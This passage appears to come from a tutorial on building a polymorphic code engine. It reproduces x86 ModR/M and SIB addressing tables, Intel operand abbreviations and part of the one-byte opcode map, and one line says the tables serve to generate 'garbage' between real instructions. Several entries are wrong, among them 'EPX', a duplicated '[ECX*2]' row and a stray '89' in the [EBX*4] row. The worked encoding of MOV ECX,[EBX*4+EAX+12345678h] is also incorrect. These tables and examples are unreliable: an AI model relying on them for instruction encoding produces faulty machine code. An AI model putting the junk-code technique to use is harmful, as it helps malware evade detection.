 ³ [ESI]          ³ 00  110 ³ 06  ³ 0E  ³ 16  ³ 1E  ³ 26  ³ 2E  ³ 36  ³ 3E  ³
 ³ [EDI]          ³ 00  111 ³ 07  ³ 0F  ³ 17  ³ 1F  ³ 27  ³ 2F  ³ 37  ³ 3F  ³
 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄ´
 ³ disp8[EAX]     ³ 01  000 ³ 40  ³ 48  ³ 50  ³ 58  ³ 60  ³ 68  ³ 70  ³ 78  ³
 ³ disp8[ECX]     ³ 01  001 ³ 41  ³ 49  ³ 51  ³ 59  ³ 61  ³ 69  ³ 71  ³ 79  ³
 ³ disp8[EDX]     ³ 01  010 ³ 42  ³ 4A  ³ 52  ³ 5A  ³ 62  ³ 6A  ³ 72  ³ 7A  ³
 ³ disp8[EPX];    ³ 01  011 ³ 43  ³ 4B  ³ 53  ³ 5B  ³ 63  ³ 6B  ³ 73  ³ 7B  ³
 ³ disp8[--] [--] ³ 01  100 ³ 44  ³ 4C  ³ 54  ³ 5C  ³ 64  ³ 6C  ³ 74  ³ 7C  ³
 ³ disp8[ebp]     ³ 01  101 ³ 45  ³ 4D  ³ 55  ³ 5D  ³ 65  ³ 6D  ³ 75  ³ 7D  ³
 ³ disp8[ESI]     ³ 01  110 ³ 46  ³ 4E  ³ 56  ³ 5E  ³ 66  ³ 6E  ³ 76  ³ 7E  ³
 ³ disp8[EDI]     ³ 01  111 ³ 47  ³ 4F  ³ 57  ³ 5F  ³ 67  ³ 6F  ³ 77  ³ 7F  ³
 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄ´
 ³ disp32[EAX]    ³ 10  000 ³ 80  ³ 88  ³ 90  ³ 98  ³ A0  ³ A8  ³ B0  ³ B8  ³
 ³ disp32[ECX]    ³ 10  001 ³ 81  ³ 89  ³ 91  ³ 99  ³ A1  ³ A9  ³ B1  ³ B9  ³
 ³ disp32[EDX]    ³ 10  010 ³ 82  ³ 8A  ³ 92  ³ 9A  ³ A2  ³ AA  ³ B2  ³ BA  ³
 ³ disp32[EBX]    ³ 10  011 ³ 83  ³ 8B  ³ 93  ³ 9B  ³ A3  ³ AB  ³ B3  ³ BB  ³
 ³ disp32[--] [--]³ 10  100 ³ 84  ³ 8C  ³ 94  ³ 9C  ³ A4  ³ AC  ³ B4  ³ BC  ³
 ³ disp32[EBP]    ³ 10  101 ³ 85  ³ 8D  ³ 95  ³ 9D  ³ A5  ³ AD  ³ B5  ³ BD  ³
 ³ disp32[ESI]    ³ 10  110 ³ 86  ³ 8E  ³ 96  ³ 9E  ³ A6  ³ AE  ³ B6  ³ BE  ³
 ³ disp32[EDI]    ³ 10  111 ³ 87  ³ 8F  ³ 97  ³ 9F  ³ A7  ³ AF  ³ B7  ³ BF  ³
 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄ´
 ³ EAX/AX/AL      ³ 11  000 ³ C0  ³ C8  ³ D0  ³ D8  ³ E0  ³ E8  ³ F0  ³ F8  ³
 ³ ECX/CX/CL      ³ 11  001 ³ C1  ³ C9  ³ D1  ³ D9  ³ E1  ³ E9  ³ F1  ³ F9  ³
 ³ EDX/DX/DL      ³ 11  010 ³ C2  ³ CA  ³ D2  ³ DA  ³ E2  ³ EA  ³ F2  ³ FA  ³
 ³ EBX/BX/BL      ³ 11  011 ³ C3  ³ CB  ³ D3  ³ DB  ³ E3  ³ EB  ³ F3  ³ FB  ³
 ³ ESP/SP/AH      ³ 11  100 ³ C4  ³ CC  ³ D4  ³ DC  ³ E4  ³ EC  ³ F4  ³ FC  ³
 ³ EBP/BP/CH      ³ 11  101 ³ C5  ³ CD  ³ D5  ³ DD  ³ E5  ³ ED  ³ F5  ³ FD  ³
 ³ ESI/SI/DH      ³ 11  110 ³ C6  ³ CE  ³ D6  ³ DE  ³ E6  ³ EE  ³ F6  ³ FE  ³
 ³ EDI/DI/BH      ³ 11  111 ³ C7  ³ CF  ³ D7  ³ DF  ³ E7  ³ EF  ³ F7  ³ FF  ³
 ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÁÄÄÄÄÄÁÄÄÄÄÄÁÄÄÄÄÄÁÄÄÄÄÄÁÄÄÄÄÄÁÄÄÄÄÄÁÄÄÄÄÄÙ

        Let's take an example:

        MOV EBX, [EBP+12345678h]

        12345678h = disp32 -> part 3
        EBP+disp32         -> line 6 of part 3
        EBX                -> REG row 4

        ==> instruction codification = 8Bh 9Dh 78h 56h 34h 12h

 ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
 NOTES: [--] [--] means a SIB follows the ModR/M byte. disp8 denotes an 8-bit
 displacement  following  the  SIB byte, to be sign-extended and added to the
 index. disp32 denotes a 32-bit displacement following the ModR/M byte, to be
 added to the index.
 ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ


 32-Bit Addressing Forms with the SIB Byte

 ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÂÄÄÄÄÄÂÄÄÄÄÄÂÄÄÄÄÄÂÄÄÄÄÄÂÄÄÄÄÄÂÄÄÄÄÄÂÄÄÄÄÄ¿
 ³    r32                   ³ EAX ³ ECX ³ EDX ³ EBX ³ ESP ³ [*] ³ ESI ³ EDI ³
 ³    Base =                ³ 0   ³ 1   ³ 2   ³ 3   ³ 4   ³ 5   ³ 6   ³ 7   ³
 ³    Base =                ³ 000 ³ 001 ³ 010 ³ 011 ³ 100 ³ 101 ³ 110 ³ 111 ³
 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÁÄÄÄÄÄÁÄÄÄÄÄÁÄÄÄÄÄÁÄÄÄÄÄÁÄÄÄÄÄÁÄÄÄÄÄÁÄÄÄÄÄ´
 ³             ³  SS Index  ³         ModR/M Values in Hexadecimal          ³
 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÂÄÄÄÄÄÂÄÄÄÄÄÂÄÄÄÄÄÂÄÄÄÄÄÂÄÄÄÄÄÂÄÄÄÄÄÂÄÄÄÄÄ´
 ³ [EAX]       ³   00  000  ³ 00  ³ 01  ³ 02  ³ 03  ³ 04  ³ 05  ³ 06  ³ 07  ³
 ³ [ECX]       ³   00  001  ³ 08  ³ 09  ³ 0A  ³ 0B  ³ 0C  ³ 0D  ³ 0E  ³ 0F  ³
 ³ [EDX]       ³   00  010  ³ 10  ³ 11  ³ 12  ³ 13  ³ 14  ³ 15  ³ 16  ³ 17  ³
 ³ [EBX]       ³   00  011  ³ 18  ³ 19  ³ 1A  ³ 1B  ³ 1C  ³ 1D  ³ 1E  ³ 1F  ³
 ³ none        ³   00  100  ³ 20  ³ 21  ³ 22  ³ 23  ³ 24  ³ 25  ³ 26  ³ 27  ³
 ³ [EBP]       ³   00  101  ³ 28  ³ 29  ³ 2A  ³ 2B  ³ 2C  ³ 2D  ³ 2E  ³ 2F  ³
 ³ [ESI]       ³   00  110  ³ 30  ³ 31  ³ 32  ³ 33  ³ 34  ³ 35  ³ 36  ³ 37  ³
 ³ [EDI]       ³   00  111  ³ 38  ³ 39  ³ 3A  ³ 3B  ³ 3C  ³ 3D  ³ 3E  ³ 3F  ³
 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄ´
 ³ [EAX*2]     ³   01  000  ³ 40  ³ 41  ³ 42  ³ 43  ³ 44  ³ 45  ³ 46  ³ 47  ³
 ³ [ECX*2]     ³   01  001  ³ 48  ³ 49  ³ 4A  ³ 4B  ³ 4C  ³ 4D  ³ 4E  ³ 4F  ³
 ³ [ECX*2]     ³   01  010  ³ 50  ³ 51  ³ 52  ³ 53  ³ 54  ³ 55  ³ 56  ³ 57  ³
 ³ [EBX*2]     ³   01  011  ³ 58  ³ 59  ³ 5A  ³ 5B  ³ 5C  ³ 5D  ³ 5E  ³ 5F  ³
 ³ none        ³   01  100  ³ 60  ³ 61  ³ 62  ³ 63  ³ 64  ³ 65  ³ 66  ³ 67  ³
 ³ [EBP*2]     ³   01  101  ³ 68  ³ 69  ³ 6A  ³ 6B  ³ 6C  ³ 6D  ³ 6E  ³ 6F  ³
 ³ [ESI*2]     ³   01  110  ³ 70  ³ 71  ³ 72  ³ 73  ³ 74  ³ 75  ³ 76  ³ 77  ³
 ³ [EDI*2]     ³   01  111  ³ 78  ³ 79  ³ 7A  ³ 7B  ³ 7C  ³ 7D  ³ 7E  ³ 7F  ³
 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄ´
 ³ [EAX*4]     ³   10  000  ³ 80  ³ 81  ³ 82  ³ 83  ³ 84  ³ 85  ³ 86  ³ 87  ³
 ³ [ECX*4]     ³   10  001  ³ 88  ³ 89  ³ 8A  ³ 8B  ³ 8C  ³ 8D  ³ 8E  ³ 8F  ³
 ³ [EDX*4]     ³   10  010  ³ 90  ³ 91  ³ 92  ³ 93  ³ 94  ³ 95  ³ 96  ³ 97  ³
 ³ [EBX*4]     ³   10  011  ³ 98  ³ 89  ³ 9A  ³ 9B  ³ 9C  ³ 9D  ³ 9E  ³ 9F  ³
 ³ none        ³   10  100  ³ A0  ³ A1  ³ A2  ³ A3  ³ A4  ³ A5  ³ A6  ³ A7  ³
 ³ [EBP*4]     ³   10  101  ³ A8  ³ A9  ³ AA  ³ AB  ³ AC  ³ AD  ³ AE  ³ AF  ³
 ³ [ESI*4]     ³   10  110  ³ B0  ³ B1  ³ B2  ³ B3  ³ B4  ³ B5  ³ B6  ³ B7  ³
 ³ [EDI*4]     ³   10  111  ³ B8  ³ B9  ³ BA  ³ BB  ³ BC  ³ BD  ³ BE  ³ BF  ³
 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄÅÄÄÄÄÄ´
 ³ [EAX*8]     ³   11  000  ³ C0  ³ C1  ³ C2  ³ C3  ³ C4  ³ C5  ³ C6  ³ C7  ³
 ³ [ECX*8]     ³   11  001  ³ C8  ³ C9  ³ CA  ³ CB  ³ CC  ³ CD  ³ CE  ³ CF  ³
 ³ [EDX*8]     ³   11  010  ³ D0  ³ D1  ³ D2  ³ D3  ³ D4  ³ D5  ³ D6  ³ D7  ³
 ³ [EBX*8]     ³   11  011  ³ D8  ³ D9  ³ DA  ³ DB  ³ DC  ³ DD  ³ DE  ³ DF  ³
 ³ none        ³   11  100  ³ E0  ³ E1  ³ E2  ³ E3  ³ E4  ³ E5  ³ E6  ³ E7  ³
 ³ [EBP*8]     ³   11  101  ³ E8  ³ E9  ³ EA  ³ EB  ³ EC  ³ ED  ³ EE  ³ EF  ³
 ³ [ESI*8]     ³   11  110  ³ F0  ³ F1  ³ F2  ³ F3  ³ F4  ³ F5  ³ F6  ³ F7  ³
 ³ [EDI*8]     ³   11  111  ³ F8  ³ F9  ³ FA  ³ FB  ³ FC  ³ FD  ³ FE  ³ FF  ³
 ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÁÄÄÄÄÄÁÄÄÄÄÄÁÄÄÄÄÄÁÄÄÄÄÄÁÄÄÄÄÄÁÄÄÄÄÄÁÄÄÄÄÄÙ


        Example:

                MOV ECX, [EBX*4 + EAX + 12345678h]

                [EBX*4] and ECX gives us 89h (from the SIB table)
                disp32[EAX]     gives us 80h (from 32bit addressing table)

       So, we encode: 8Bh 80h 89h 78h 56h 34h 12h
                      ³   ³   ³   ³   ³   ³   ³
                      ³   ³   ³   ÀÄÄÄÁÄÄÄÁÄÄÄÁÄÄÄÄ> immediate value
                      ³   ³   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ> SIB
                      ³   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ> ModR/M byte
                      ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ> Opcode

        NOTE: You should notice that immediate values are stored in inverse
 mode, first less signifiant word, then most signifiant word.

 ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
 NOTES:  [*]  means a disp32 with no base if MOD is 00, [ESP] otherwise. This
 provides the following addressing modes:

              disp32[index]      (MOD=00)
              disp8[EBP][index]  (MOD=01)
              disp32[EBP][index] (MOD=10)


        It  is  necesary  that  you  understand these tables, as they will be
 very   necesarry   when  you  will  create  the  garbage  between  the  real
 instructions.  Actually,  you  don't even need to define any table, but just
 know  how  they  are made up and only with a few calculations you can figure
 out  what  Mod/Rm  and SIB to use when you want to reach a certain result...
 It's easy, the tables and examples speak for themselves.


<ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ Opcode

        In  the  Opcode  Maps  that  will  follow  soon,  you  will find some
 abbreviations  that  you will probably find confusing... In order to lift up
 the confusion, firstly I will quote the original Intel(c) abbreviations:

        The  "Opcode" column gives the complete object code produced for each
 form  of  the instruction. When possible, the codes are given as hexadecimal
 bytes,  in  the  same  order  in which they appear in memory. Definitions of
 entries other than hexadecimal bytes are as follows:

        /digit:  (digit is between 0 and 7) indicates that the ModR/M byte of
 the  instruction  uses  only  the  r/m (register or memory) operand. The reg
 field  contains  the  digit  that provides an extension to the instruction's
 opcode.

        /r: indicates that the ModR/M byte of the instruction contains both a
 register operand and an r/m operand.

        cb,  cw,  cd,  cp:  a 1-byte (cb), 2-byte (cw), 4-byte (cd) or 6-byte
 (cp)  value  following  the opcode that is used to specify a code offset and
 possibly a new value for the code segment register.

        ib,  iw,  id:  a  1-byte  (ib), 2-byte (iw), or 4-byte (id) immediate
 operand  to  the  instruction  that  follows  the  opcode,  ModR/M  bytes or
 scale-indexing  bytes.  The  opcode  determines  if  the operand is a signed
 value. All words and doublewords are given with the low-order byte first.

        +rb,  +rw,  +rd:  a  register  code,  from  0 through 7, added to the
 hexadecimal  byte given at the left of the plus sign to form a single opcode
 byte. The codes are:

                         rb         rw         rd
                       AL = 0     AX = 0     EAX = 0
                       CL = 1     CX = 1     ECX = 1
                       DL = 2     DX = 2     EDX = 2
                       BL = 3     BX = 3     EBX = 3
                       AH = 4     SP = 4     ESP = 4
                       CH = 5     BP = 5     EBP = 5
                       DH = 6     SI = 6     ESI = 6
                       BH = 7     DI = 7     EDI = 7


<ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ Instruction

        The   "Instruction"  column  gives  the  syntax  of  the  instruction
 statement  as  it would appear in an ASM386 program. The following is a list
 of the symbols used to represent operands in the instruction statements:

        rel8:  a  relative address in the range from 128 bytes before the end
 of the instruction to 127 bytes after the end of the instruction.

        rel16,  rel32: a relative address within the same code segment as the
 instruction  assembled.  rel16  applies to instructions with an operand-size
 attribute  of  16  bits;  rel32 applies to instructions with an operand-size
 attribute of 32 bits.

        ptr16:16,  ptr16:32:  a  FAR  pointer,  typically  in  a code segment
 different  from  that  of the instruction. The notation 16:16 indicates that
 the  value of the pointer has two parts. The value to the right of the colon
 is  a  16-bit  selector or value destined for the code segment register. The
 value  to the left corresponds to the offset within the destination segment.
 ptr16:16  is  used when the instruction's operand-size attribute is 16 bits;
 ptr16:32 is used with the 32-bit attribute.

        r8: one of the byte registers AL, CL, DL, BL, AH, CH, DH, or BH.

        r16: one of the word registers AX, CX, DX, BX, SP, BP, SI, or DI.

        r32:  one  of  the doubleword registers EAX, ECX, EDX, EBX, ESP, EBP,
 ESI, or EDI.

        imm8:  an  immediate byte value. imm8 is a signed number between -128
 and  +127  inclusive. For instructions in which imm8 is combined with a word
 or  doubleword  operand, the immediate value is sign-extended to form a word
 or  doubleword. The upper byte of the word is filled with the topmost bit of
 the immediate value.

        imm16:   an   immediate   word  value  used  for  instructions  whose
 operand-size  attribute  is  16  bits.  This  is a number between -32768 and
 +32767 inclusive.

        imm32:  an  immediate  doubleword  value  used for instructions whose
 operand-size  attribute  is  32-bits.  It allows the use of a number between
 +2147483647 and -2147483648.

        r/m8:  a  one-byte  operand  that  is  either  the contents of a byte
 register (AL, BL, CL, DL, AH, BH, CH, DH), or a byte from memory.

        r/m16:  a word register or memory operand used for instructions whose
 operand-size  attribute  is 16 bits. The word registers are: AX, BX, CX, DX,
 SP,  BP, SI, DI. The contents of memory are found at the address provided by
 the effective address computation.

        r/m32:  a doubleword register or memory operand used for instructions
 whose  operand-size attribute is 32-bits. The doubleword registers are: EAX,
 EBX,  ECX,  EDX, ESP, EBP, ESI, EDI. The contents of memory are found at the
 address provided by the effective address computation.

        m8:  a  memory  byte addressed by DS:SI or ES:DI (used only by string
 instructions).

        m16:  a  memory word addressed by DS:SI or ES:DI (used only by string
 instructions).

        m32:  a  memory  doubleword addressed by DS:SI or ES:DI (used only by
 string instructions).

        m16:16, M16:32: a memory operand containing a far pointer composed of
 two  numbers.  The  number  to  the  left  of  the  colon corresponds to the
 pointer's  segment  selector.  The  number  to  the right corresponds to its
 offset.

        m16  &  32,  m16  & 16, m32 & 32: a memory operand consisting of data
 item  pairs  whose sizes are indicated on the left and the right side of the
 ampersand.  All  memory  addressing modes are allowed. m16 & 16 and m32 & 32
 operands  are used by the BOUND instruction to provide an operand containing
 an  upper  and  lower bounds for array indices. m16 & 32 is used by LIDT and
 LGDT  to provide a word with which to load the limit field, and a doubleword
 with  which to load the base field of the corresponding Global and Interrupt
 Descriptor Table Registers.

        moffs8, moffs16, moffs32: (memory offset) a simple memory variable of
 type  BYTE, WORD, or DWORD used by some variants of the MOV instruction. The
 actual  address is given by a simple offset relative to the segment base. No
 ModR/M  byte  is  used  in  the  instruction.  The  number  shown with moffs
 indicates its size, which is determined by the address-size attribute of the
 instruction.

        Sreg:  a  segment  register. The segment register bit assignments are
 ES=0, CS=1, SS=2, DS=3, FS=4, and GS=5.


<ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ  Opcode Map

        The next three tables represent the original Intel codification for
 the 80386 instruction set, formated by me so it can fit the page. You will
 see the following tables:

        1. The One-byte Opcode table. This is a 16*16 table. The row followed
 by the column gives the opcode, like this:

               0         1         2         3         4
           ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ........
           ³                            ADD
          0ÃÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄ........
           ³ Eb,Gb  ³ Ev,Gv  ³  Gb,Eb  ³  Gv,Ev  ³  AL,Ib
           ÃÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄ........
           ³                                               :
           :                                               :

      03h means ADD Gv,Ev
      00h means ADD Eb,Gb

      (reffer to abbreviations below)

        2.  The  Two-Byte  Opcode  table.  This  table looks exactly like the
 precedent,  but the opcode for the instruction is formed from two bytes: the
 first  one  is  0Fh  (escape), and the second is formed from the row and the
 column.

        3. The Groups. This is a 8*8 table filled with instructions that have
 the  actual  opcode  on  the second byte in the place where normally the REG
 field is in the ModR/M byte.

        Note:  both  tables  1  and  2 are 'broke' in two so they can fit the
 page.  A  good idea is to print out the tables and stick the pages to make a
 big table. This will allow you to create your own personal codification.

        Let's check the abreviations and the tables first:

 Key to Abbreviations
 ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

        Operands  are  identified by a two-character code of the form Zz. The
 first  character,  an uppercase letter, specifies the addressing method; the
 second character, a lowercase letter, specifies the type of operand.


 Codes for Addressing Method
 ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

        A  Direct address; the instruction has no modR/M byte; the address of
           the operand is encoded in the instruction; no base register, index
           register, or scaling factor can be applied; e.g., far JMP (EA).

        C  The reg field of the modR/M byte selects a control register; e.g.,
           MOV (0F20, 0F22).

        D  The  reg  field of the modR/M byte selects a debug register; e.g.,
           MOV (0F21,0F23).

        E  A  modR/M  byte  follows the opcode and specifies the operand. The
           operand is either a general register or a memory address. If it is
           a  memory address, the address is computed from a segment register
           and  any  of  the  following  values:  a  base  register, an index
           register, a scaling factor, a displacement.

        F Flags Register.

        G  The reg field of the modR/M byte selects a general register; e.g.,
           ADD (00).

        I  Immediate  data. The value of the operand is encoded in subsequent
           bytes of the instruction.

        J  The  instruction  contains  a  relative  offset to be added to the
           instruction pointer register; e.g., JMP short, LOOP.

        M  The  modR/M  byte may refer only to memory; e.g., BOUND, LES, LDS,
           LSS, LFS, LGS.

        O  The  instruction  has no modR/M byte; the offset of the operand is
           coded  as  a  word  or  double  word  (depending  on  address size
           attribute)  in  the instruction. No base register, index register,
           or scaling factor can be applied; e.g., MOV (A0-A3).

        R  The  mod  field  of  the  modR/M  byte may refer only to a general
           register; e.g., MOV (0F20-0F24, 0F26).

        S  The reg field of the modR/M byte selects a segment register; e.g.,
           MOV (8C,8E).

        T The reg field of the modR/M byte selects a test register; e.g., MOV
           (0F24,0F26).

        X Memory addressed by DS:SI; e.g., MOVS, COMPS, OUTS, LODS, SCAS.

        Y Memory addressed by ES:DI; e.g., MOVS, CMPS, INS, STOS.


 Codes for Operant Type
 ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

        a  Two  one-word  operands  in  memory or two double-word operands in
           memory, depending on operand size attribute (used only by BOUND).

        b Byte (regardless of operand size attribute)

        c Byte or word, depending on operand size attribute.

        d Double word (regardless of operand size attribute)

        p 32-bit or 48-bit pointer, depending on operand size attribute.

        s Six-byte pseudo-descriptor

        v Word or double word, depending on operand size attribute.

        w Word (regardless of operand size attribute)


 Register Codes
 ÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

        When  an  operand  is  a specific register encoded in the opcode, the
 register  is  identified  by its name; e.g., AX, CL, or ESI. The name of the
 register  indicates  whether  the  register  is  32-, 16-, or 8-bits wide. A
 register  identifier  of the form eXX is used when the width of the register
 depends  on  the operand size attribute; for example, eAX indicates that the
 AX  register  is  used  when  the  operand  size attribute is 16 and the EAX
 register is used when the operand size attribute is 32.


 One-Byte Opcode Map
 ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

     0         1         2         3         4         5         6        7
 ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄ¿
 ³                            ADD                          ³  PUSH  ³   POP  ³
0ÃÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄ´        ³        ³
 ³ Eb,Gb  ³ Ev,Gv  ³  Gb,Eb  ³  Gv,Ev  ³  AL,Ib  ³ eAX,Iv  ³   ES   ³   ES   ³
 ÃÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄ´
 ³                            ADC                          ³  PUSH  ³   POP  ³
1ÃÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄ´        ³        ³
 ³ Eb,Gb  ³ Ev,Gv  ³  Gb,Eb  ³  Gv,Ev  ³  AL,Ib  ³ eAX,Iv  ³   SS   ³   SS   ³
 ÃÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄ´
 ³                            AND                          ³  SEG   ³        ³
2ÃÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄ´        ³   DAA  ³
 ³ Eb,Gb  ³ Ev,Gv  ³  Gb,Eb  ³  Gv,Ev  ³  AL,Ib  ³ eAX,Iv  ³  =ES   ³        ³
 ÃÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄ´
 ³                            XOR                          ³  SEG   ³        ³
3ÃÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄ´        ³   AAA  ³
 ³ Eb,Gb  ³ Ev,Gv  ³  Gb,Eb  ³  Gv,Ev  ³  AL,Ib  ³ eAX,Iv  ³  =SS   ³        ³
 ÃÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄ´
 ³                             INC general register                          ³
4ÃÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄ´
 ³  eAX   ³  eCX   ³   eDX   ³   eBX   ³   eSP   ³   eBP   ³  eSI   ³  eDI   ³
 ÃÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄ´
 ³                             PUSH general register                         ³
5ÃÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄ´
